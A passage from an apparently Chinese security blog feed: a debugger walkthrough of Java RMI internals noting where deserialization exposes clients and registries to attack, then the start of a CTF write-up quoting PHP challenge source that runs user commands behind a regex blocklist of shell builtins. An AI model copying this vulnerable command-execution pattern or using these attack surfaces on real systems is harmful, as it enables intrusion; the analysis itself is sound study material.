然后二者建立JRMP链接</p><p>随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”。我们看一下Registry的回复内容。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606160324349.png" alt="image-20240606160324349"></p><p>以下是ReturnData的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000   00 0c 29 97 34 1c 00 50 56 fb 95 99 08 00 45 00   ..).4..PV.....E.</span><br><span class="line">0010   01 5f ff 13 00 00 80 06 c3 a8 c0 a8 01 0b c0 a8   ._..............</span><br><span class="line">0020   f4 80 04 4b c3 b0 3e 74 47 95 a8 61 e0 04 50 18   ...K..&gt;tG..a..P.</span><br><span class="line">0030   fa f0 b2 f6 00 00 51 ac ed 00 05 77 0f 01 6e 7a   ......Q....w..nz</span><br><span class="line">0040   dd fb 00 00 01 8f ec 5e 33 e9 80 0e 73 7d 00 00   .......^3...s&#125;..</span><br><span class="line">0050   00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d   ....java.rmi.Rem</span><br><span class="line">0060   6f 74 65 00 0e 6f 72 67 2e 72 6d 69 2e 49 48 65   ote..org.rmi.IHe</span><br><span class="line">0070   6c 6c 6f 70 78 72 00 17 6a 61 76 61 2e 6c 61 6e   llopxr..java.lan</span><br><span class="line">0080   67 2e 72 65 66 6c 65 63 74 2e 50 72 6f 78 79 e1   g.reflect.Proxy.</span><br><span class="line">0090   27 da 20 cc 10 43 cb 02 00 01 4c 00 01 68 74 00   &#x27;. ..C....L..ht.</span><br><span class="line">00a0   25 4c 6a 61 76 61 2f 6c 61 6e 67 2f 72 65 66 6c   %Ljava/lang/refl</span><br><span class="line">00b0   65 63 74 2f 49 6e 76 6f 63 61 74 69 6f 6e 48 61   ect/InvocationHa</span><br><span class="line">00c0   6e 64 6c 65 72 3b 70 78 70 73 72 00 2d 6a 61 76   ndler;pxpsr.-jav</span><br><span class="line">00d0   61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 65 6d   a.rmi.server.Rem</span><br><span class="line">00e0   6f 74 65 4f 62 6a 65 63 74 49 6e 76 6f 63 61 74   oteObjectInvocat</span><br><span class="line">00f0   69 6f 6e 48 61 6e 64 6c 65 72 00 00 00 00 00 00   ionHandler......</span><br><span class="line">0100   00 02 02 00 00 70 78 72 00 1c 6a 61 76 61 2e 72   .....pxr..java.r</span><br><span class="line">0110   6d 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65   mi.server.Remote</span><br><span class="line">0120   4f 62 6a 65 63 74 d3 61 b4 91 0c 61 33 1e 03 00   Object.a...a3...</span><br><span class="line">0130   00 70 78 70 77 36 00 0a 55 6e 69 63 61 73 74 52   .pxpw6..UnicastR</span><br><span class="line">0140   65 66 00 0d 31 39 32 2e 31 36 38 2e 32 34 34 2e   ef..192.168.244.</span><br><span class="line">0150   31 00 00 f0 20 bb b8 2f e8 ae 23 c6 5f 6e 7a dd   1... ../..#._nz.</span><br><span class="line">0160   fb 00 00 01 8f ec 5e 33 e9 80 01 01 78            ......^3....x</span><br></pre></td></tr></table></figure><p>行0030 中<code>\xAC\xED</code>(ac ed)是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了.</p><p>行0150 中<code>\xF0 \x20</code>(f0 20)转换为十进制是61474, 这就是Server在本地开放的随机端口,这和之后与端口61474相对应</p><p>因此这条TCP链的作用就是Client根据传入的rmi地址链接远端服务器1099端口上的RMI Registry, 然后Registry向Client发送Server上的序列化数据，包括IP和开放的随机端口等。</p><p>再往下是第二个TCP链接, Client连接ReturnData中返回的端口，这条TCP链接用于Client与Server之间的传输数据。实际上是Client的Stub和Server上的Skeleton之间进行数据传输的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162034685.png" alt="image-20240606162034685"></p><p>之后是TCP四次挥手, 断开TCP连接</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162204581.png" alt="image-20240606162204581"></p><p>在此之中, Registry充当着类似网关的角色, 为Client返回远程对象的绑定信息, 然后Client的Stub连接位于Server上的Skeleton，最终远程方法还是在服务器上执行。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-81-1024x633.png" alt="图片-81-1024x633"></p><h2 id="RMI有关类介绍"><a href="#RMI有关类介绍" class="headerlink" title="RMI有关类介绍"></a>RMI有关类介绍</h2><h4 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h4><p><code>LiveRef</code> 是 <code>java.rmi.server</code> 包中的一个类，负责管理远程对象的引用。它包括以下功能：</p><ol><li><strong>标识远程对象</strong>：每个远程对象在 JVM 中都有一个唯一的 <code>LiveRef</code> 实例，该实例用于唯一标识该远程对象。</li><li><strong>管理连接</strong>：维护客户端与远程对象之间的连接，确保远程对象的调用能够正确传递。</li><li><strong>引用计数</strong>：跟踪对远程对象的引用计数，以便在不再需要时正确地清理和回收资源。</li></ol><h4 id="UnicastRef"><a href="#UnicastRef" class="headerlink" title="UnicastRef"></a>UnicastRef</h4><p><code>UnicastRef</code> 负责处理远程方法调用的序列化和反序列化，将调用参数从客户端传输到服务器，并将结果从服务器返回给客户端。</p><p>它管理底层的网络连接和通信协议，确保远程方法调用能够正确地传递和处理。</p><p><code>UnicastRef</code> 包含一个 <code>LiveRef</code> 实例(封装)，<code>LiveRef</code> 保存了远程对象的引用信息，如对象标识符（<code>ObjID</code>）、远程对象所在的地址（<code>Endpoint</code>）、以及用于通信的底层通道。</p><h5 id="关键方法和属性"><a href="#关键方法和属性" class="headerlink" title="关键方法和属性"></a>关键方法和属性</h5><ul><li>**<code>newCall</code>**：创建一个新的远程调用。</li><li>**<code>invoke</code>**：执行远程调用。</li><li>**<code>done</code>**：完成远程调用并处理结果。</li></ul><h4 id="UnicastServerRef"><a href="#UnicastServerRef" class="headerlink" title="UnicastServerRef"></a>UnicastServerRef</h4><p><code>UnicastServerRef</code> 是 Java RMI（Remote Method Invocation）框架中的一个类，用于管理<strong>单播</strong>远程对象的引用。在 Java RMI 中，远程对象需要被导出以便能够被远程调用，<code>UnicastServerRef</code> 类就是处理这些对象<strong>引用</strong>的主要类之一。</p><p>UnicastServerRef封装了LiveRef</p><blockquote><p>单播远程对象（Unicast Remote Object）是指在 RMI 中，一个特定的远程对象实例，只能在一个特定的地址（主机和端口）上被访问。与之相对的是多播对象（Multicast Object），后者可以通过多个路径访问。</p></blockquote><p><code>UnicastServerRef</code> 类是 <code>UnicastRef</code> 类的子类，继承了其一些基础功能，并添加了处理服务器端逻辑的功能。</p><h4 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h4><p><code>UnicastRemoteObject</code> 是一个便捷类，简化了创建远程对象的过程。它扩展了 <code>java.rmi.server.RemoteServer</code> 并实现了 <code>java.rmi.server.ServerRef</code> 接口</p><p><code>UnicastRemoteObject</code> 封装了 <code>UnicastServerRef</code> 的功能。</p><p>具体来说，当你创建一个 <code>UnicastRemoteObject</code> 时，它会在内部创建一个 <code>UnicastServerRef</code> 实例来处理实际的远程调用。</p><h4 id="RegistryImpl"><a href="#RegistryImpl" class="headerlink" title="RegistryImpl"></a>RegistryImpl</h4><p><code>RegistryImpl</code> 是 RMI 的一个内部实现类，它实现了<code>Registry</code>接口, 用于实现注册表服务。</p><p><code>RegistryImpl</code> 封装了<code>UnicastServerRef</code>, 使用 <code>UnicastServerRef</code> 来管理其自身的网络通信和远程对象引用。</p><h2 id="RMI流程源码分析"><a href="#RMI流程源码分析" class="headerlink" title="RMI流程源码分析"></a>RMI流程源码分析</h2><p>有了上面对于RMI流程的分析，下面我们根据源码来捋一捋信息是怎么在Server、Client与Registry中流动的。</p><p>其总体的一个调用方式是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1592803976000-5xjsli.png" alt="1592803976000-5xjsli"></p><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br></pre></td></tr></table></figure><h4 id="发布远程对象"><a href="#发布远程对象" class="headerlink" title="发布远程对象"></a>发布远程对象</h4><p>这里还是比较复杂, 我自己梳理了一下把关键步骤画了一个流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/rmi_server.jpg"></p><p>断点打在 RMIServer 的创建远程对象这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606170622577.png" alt="image-20240606170622577"></p><p>首先我们要分析的是一个远程对象是如何被发布到网络上去的</p><p><strong><code>RMIHello</code></strong> 这个类是继承于 <code>UnicastRemoteObject</code> 的，我们使用了父类的构造器来创建它。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606171457782.png" alt="image-20240606171457782"></p><p>这里exportObject表示导出(发布)这个对象自身(this)到0端口(后面会看见这其实表示随机端口),</p><p>F7跟进exportObject()</p><p><code>exportObject()</code> 是一个静态函数，它就是主要负责<strong>将远程服务发布到网络上</strong></p><p>第一个参数是 obj 对象，第二个参数是 <code>new UnicastServerRef(port)</code>，第二个参数是用来处理网络请求的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172149233.png" alt="image-20240606172149233"></p><p>这里实际上是一个动态代理中典型的封装操作, obj本身是一个要被发布出去的对象, 这个对象只在乎其包含了哪些功能, 对于如何发布它, 它如何与客户端进行网络请求并不关心, 因此这里的<code>UnicastServerRef</code>就是利用动态代理的方式来增强这个对象, 完成网络请求的功能</p><p>继续跟进<code>UnicastServerRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172355596.png" alt="image-20240606172355596"></p><p>它 new 了一个 LiveRef(port)，这个非常重要，它算是一个网络引用的类，跟进看一看。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172501903.png" alt="image-20240606172501903"></p><p>跟进去之后，先是一个构造函数，先跳进 this 看一看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172556199.png" alt="image-20240606172556199"></p><p>第一个参数 ID，第三个参数为 true，所以我们重点关注一下第二个参数。</p><blockquote><p>TCPEndpoint 是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个 IP 与一个端口，也就是说传进去一个 IP 和一个端口，就可以进行网络请求。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172722549.png" alt="image-20240606172722549"></p><p>F8跳过这个方法, 继续F7进到 LiveRef 的构造函数 this 里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172942389.png" alt="image-20240606172942389"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606173251407.png" alt="image-20240606173251407"></p><p>此时发现 host 和 port 是赋值到了 endpoint 里面，而 endpoint 又是被封装在 LiveRef 里面的，</p><p>所以这些网络请求相关的数据是在 LiveRef 里面，并且这一 LiveRef 至始至终只会存在一个。</p><p>上述是 LiveRef 创建的过程，然后我们一路F8再回到之前出现 <code>LiveRef(port)</code> 的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174046968.png" alt="image-20240606174046968"></p><p>刚刚看完了new LiveRef() 的过程, 接下来F7到super中看一看它的父类 <code>UnicastRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174412573.png" alt="image-20240606174412573"></p><p>这里<code>UnicastServerRef</code> 是继承了<code>UnicastRef</code>,</p><p>此时<code>ref</code>这个属性就是对其在网络上的一个描述, 包括了其所开放在的ip与端口位置</p><p>一路 f7 回到exportObject()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174558218.png" alt="image-20240606174558218"></p><p>此前我们分析的是new UnicastServerRef(port)的过程, 继续F7</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174637562.png" alt="image-20240606174637562"></p><p>刚刚的sref(也就是对远程对象在网络上位置的描述)被赋值给了远程对象obj的ref属性</p><p>继续往后看, 进去下面那个<code>sref.exportObject()</code> 注意此时调用的是sref(也就是程序中新创建的)的方法, 并不是远程对象的属性ref</p><p>直到此处出现 Stub</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175005366.png" alt="image-20240606175005366"></p><p>Stub明明是Client中的存根, 为什么会出现在Server中呢?</p><blockquote><ul><li>RMI 先在 Service 的地方，也就是服务端创建一个 Stub，再把 Stub 传到 RMI Registry 中，最后让 RMI Client 去获取 Stub。</li></ul></blockquote><p>接着我们研究 Stub 产生的这一步，</p><p>先F8到197行, 再F7进到 <code>createProxy</code> 这个方法里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175626515.png" alt="image-20240606175626515"></p><p>注意: 这里的第二个参数<code>clientRef</code> 由<code>getClientRef()</code>产生, 通过观察变量值, 他与服务器上远程对象的ref属性是同一个</p><p>我们往下看, 这里并不会进去if里面, 先不看这个if</p><p> 可以看见下面有一个很明显的动态代理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175615840.png" alt="image-20240606175615840"></p><p>第一个参数是 <code>AppClassLoader</code>，第二个参数是一个远程接口，第三个参数是调用处理器，调用处理器里面只有一个 ref，它也是和之前我们看到的 ref 是同一个</p><p>创建远程服务当中永远只有一个 ref。</p><p>继续F8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205627290.png" alt="image-20240606205627290"></p><p>到这里就把动态代理创建好了，如图创建好了一个Stub等待客户端来获取(这个Stub并不包含远程对象本身)</p><p>继续 f8，到 Target 这里，Target 这里相当于一个总的封装，将所有用的东西放到 Target 里面，我们可以进去看一看 Target 里面都放了什么。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205812091.png" alt="image-20240606205812091"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205839158.png" alt="image-20240606205839158"></p><p>并且这里的几个 ref 都是同一个，通过 ID 就可以查看到它们是同一个。比如比较 disp 和 stub 的。一个是服务端 ，一个是客户端的，ID 是一样的，</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222744415.png" alt="image-20240606222744415"></p><p>一路 f8，回到之前的 Target，下一条语句是 <code>ref.exportObject(target)</code>，把 target 这个封装好了的对象发布出去。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222922598.png" alt="image-20240606222922598"></p><p>我们一路F7跟进, 直到这里的listen进行网络请求</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223026872.png" alt="image-20240606223026872"></p><p>继续F7跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223314933.png" alt="image-20240606223314933"></p><p>这里获取了<code>TCPEndpoint</code></p><p>我们F8进入到<code>server = ep.newServerSocket();</code>这里跟进</p><p>它创建了一个新的 socket，已经准备好了，等别人来连接</p><p>并且这个 <code>newServerSocket()</code> 方法会给 port 进行赋值, 若port被设置为0则随机赋一个值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223854543.png" alt="image-20240606223854543"></p><p>然后回到 listen 去，一路 f8，观察一下整个流程结束之后 Target 里面是增加了 port。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224204732.png" alt="image-20240606224204732"></p><h4 id="发布完成之后的记录"><a href="#发布完成之后的记录" class="headerlink" title="发布完成之后的记录"></a>发布完成之后的记录</h4><p>我们F7进去<code>super.exportObject(target);</code>这里, 也就是上一张图片的260行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224724277.png" alt="image-20240606224724277"></p><p>我们F7跟进<code>ObjectTable.putTarget(target);</code></p><p>进去后一路F8 </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225107839.png" alt="image-20240606225107839"></p><p>直到此处, RMI 这里会把所有的信息保存到<strong>两个 table</strong>里面</p><p>类似于日志, 这些记录是保存到静态的 HashMap 当中。</p><h3 id="创建注册中心-绑定"><a href="#创建注册中心-绑定" class="headerlink" title="创建注册中心 + 绑定"></a>创建注册中心 + 绑定</h3><p>我们使用<code>registry.bind</code>来注册, 断电打在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225831522.png" alt="image-20240606225831522"></p><p>可以看见<code>createRegistry</code>方法返回<code>RegistryImpl</code>对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606165122844.png" alt="image-20240606165122844"></p><p>F7进去, 有一大堆的安全验证不太重要直接F8过了</p><p>直到<code>RegistryImpl</code>, 我们F7进去</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231221520.png" alt="image-20240606231221520"></h3><p>这里有一步判断 port 是否为注册中心的 port</p><p>再往下走，它创建了一个 <code>LiveRef</code>，以及创建了一个新的 <code>UnicastServerRef</code>，这段代码就和我们上面讲的创建远程对象是很类似的，我们可以跟进 <code>setup</code> 看一下</p><p>跟进之后发现和之前是一样的，也是先赋值，然后进行 <code>exportObject()</code> 方法的调用。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231642087.png" alt="image-20240606231642087"></p><p>我们还是F7进入<code>exportObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607184256288.png" alt="image-20240607184256288"></p><p>到了创建 Stub 的阶段。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185404298.png" alt="image-20240607185404298"></p><p>这里与发布对象时有所不同, 这里会进到<code>createStub</code>这个函数中, 发布对象时不进入这个if, 往后直接创建了动态代理</p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185801158.png" alt="image-20240607185801158"></p><p>这里使用<code>forname</code>反射创建</p><p>一路F8, 回到<code>createProxy</code>的地方, 下面就是<code>setSkeleton</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607190052291.png" alt="image-20240607190052291"></p><p>顾名思义就是创建<code>Skeleton</code>骨架</p><p>再往后就是创建<code>Target</code>与之前相同 F8跳过</p><p>直到一步<code>super.exportObject()</code>进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607212901501.png" alt="image-20240607212901501"></p><p>这里也和之前类似, 把封装的 target put到一个table里, 我们可以跟进去putTarget看一下, 去之前的操作是类似的</p><p>我们F8把这些流程走完, 之后就是保存了一些数据</p><p>我们再来看绑定是如何实现的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115147520.png" alt="image-20240608115147520"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115313738.png" alt="image-20240608115313738"></p><p>这里首先检查bindings这个hashTable是否为空, 若空则把远程对象的引用放进去(ip 端口)</p><p>比较简单的一个过程</p><p>这里我也画了一个大致的流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/RMI_Registry_2.jpg" alt="RMI_Registry_2"></p><h3 id="客户端调用注册中心"><a href="#客户端调用注册中心" class="headerlink" title="客户端调用注册中心"></a>客户端调用注册中心</h3><p>前面都是很安全的操作, 到这一步, 如之前抓包所说, 存在反序列化的操作, 因此这里是受威胁的</p><h4 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h4><p>这个过程去创建注册中心是高度相似的, 就不做展示了</p><p>我们快速过完后就会发现这里已经获取到注册中心的stub了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609152349355.png" alt="image-20240609152349355"></p><h4 id="lookup查找远程对象"><a href="#lookup查找远程对象" class="headerlink" title="lookup查找远程对象"></a>lookup查找远程对象</h4><p>很可惜这里有一部分是.class文件,没法调试, 在lookup处打断点会跳转到别的地方</p><p>不过问题不大, 我们先F8找到lookup处</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609153619883.png" alt="image-20240609153619883"></p><p>注意这里的<code>var3.writeObject(var1);</code>var1是lookup的参数, 也就是<code>hello</code>这里被反序列化后传了进去, 在这之后registry会反序列化读取, 这就造成了威胁</p><p>后面就是<code>super.ref.invoke(var2);</code>这里<code>super.ref</code>就是<code>UnicastRef</code>这个类, 我们直接去这个类下的invoke打断点</p><p>之后就可以跳转到这个方法中, 这里是可以调试的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609160036017.png" alt="image-20240609160036017"></p><p>这里的 <code>invoke()</code> 方法是类似于激活的方法</p><p><code>invoke</code>里会调用<code>call.executeCall();</code>它是真正处理网络请求的方法，也就是客户端的网络请求都是通过这个方法实现的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161551640.png" alt="image-20240609161551640"></p><p>这里往下会有一处<code>ReadObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161525554.png" alt="image-20240609161525554"></p><p><code>in</code>是在这里创建的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161732711.png" alt="image-20240609161732711"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161757770.png" alt="image-20240609161757770"></p><p>不难理解，in 就是数据流里面的东西。</p><blockquote><p>这里获取异常的本意应该是在报错的时候把一整个信息都拿出来，这样会更清晰一点，但是这里就出问题了 ———— 如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞。这里的漏洞相比于其他漏洞更为隐蔽。</p><ul><li>也就是说，只要调用 <code>invoke()</code>，就会导致漏洞。RMI 在设计之初就并未考虑到这个问题，导致客户端都是易受攻击的。</li></ul></blockquote><p>之后走完这个过程, 结束后我们就会获取到远程对象的动态代理, 其中包含了它的ref, 明确其开放的端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162034596.png" alt="image-20240609162034596"></p><h4 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h4><p>对应了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ihello.sayHello(<span class="string">&quot;hello, n4c1!&quot;</span>);</span><br></pre></td></tr></table></figure><p>由于ihello是一个动态代理, 因此我们会跳到它的handler的invoke方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162755645.png" alt="image-20240609162755645"></p><p>这些if都不太重要, 主要是后面的</p><p>return invokeRemoteMethod(proxy, method, args);</p><p>这里看名字就知道是执行远程类的方法跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164451084.png" alt="image-20240609164451084"></p><p>到这里的<code>ref.invoke</code>继续跟进</p><p>我们往下走到这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164746609.png" alt="image-20240609164746609"></p><p>跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165026740.png" alt="image-20240609165026740"></p><p>这里会将我们传给调用方法的参数序列化写进out里</p><p>之后再往下走就又到了<code>call.executeCall()</code>,即每进行一次网络请求都会调用<code>call.executeCall()</code>这个方法, 当然这里面是易受攻击的</p><p>我们继续往下, 就到了<code>unmarshalValue</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165448317.png" alt="image-20240609165448317"></p><p>这个方法与<code>marshalValue</code>类似, 但这个是<code>readObject</code>反序列化把connection中的数据读回来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165903310.png" alt="image-20240609165903310"></p><p>因此这里也是易受攻击的</p><p>到这里这一块基本上就结束了</p><h3 id="客户端发起请求，注册中心如何处理"><a href="#客户端发起请求，注册中心如何处理" class="headerlink" title="客户端发起请求，注册中心如何处理"></a>客户端发起请求，注册中心如何处理</h3><p>断点打在下面这个位置,  找不到的话打开rt.jar(java核心类)</p><p>在sun.rmi.Transport.Transport.java中的<code>serviceCall</code>方法中.  </p><p>先debug服务端, 再运行客户端就可以断在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609183403670.png" alt="image-20240609183403670"></p><p>F8过这条, 我们看Target中, 有一个Stub, 里面有一个ref对应着1099端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200115650.png" alt="image-20240609200115650"></p><p>再往下看<code>final Dispatcher disp = target.getDispatcher();</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200944126.png" alt="image-20240609200944126"></p><p>这里是将 Target.disp(对应着<code>skel</code>) 的值放到 disp 里面。</p><p>继续往下走, 有一个<code>disp.dispatch(impl, call);</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609201951099.png" alt="image-20240609201951099"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202110937.png" alt="image-20240609202110937"></p><p>继续跟进这个<code>oldDispatch</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202255595.png" alt="image-20240609202255595"></p><p>注意这里又没法调试了, 代码会乱跳</p><p>我们需要把断点打在<code>sun.rmi.registry</code>包下的<code>RegistryImpl_Skel</code>类的<code>dispatch</code>方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202852918.png" alt="image-20240609202852918"></p><p>这段代码是用来判断客户端向registry发起的请求方式的</p><p>有以下几种,以及其对应的编号</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>只要对印的case中有反序列化就是易受攻击的</p><p>例如</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609203336416.png" alt="image-20240609203336416"></p><p>实际上除了list都是可以攻击的</p><p>并且是客户端向registry发起攻击</p><h3 id="客户端发起请求，服务端如何处理"><a href="#客户端发起请求，服务端如何处理" class="headerlink" title="客户端发起请求，服务端如何处理"></a>客户端发起请求，服务端如何处理</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj一次刷个够</title>
      <link href="/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/"/>
      <url>/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="buuoj一次刷个够"><a href="#buuoj一次刷个够" class="headerlink" title="buuoj一次刷个够"></a>buuoj一次刷个够</h1><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>网上扒来源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span 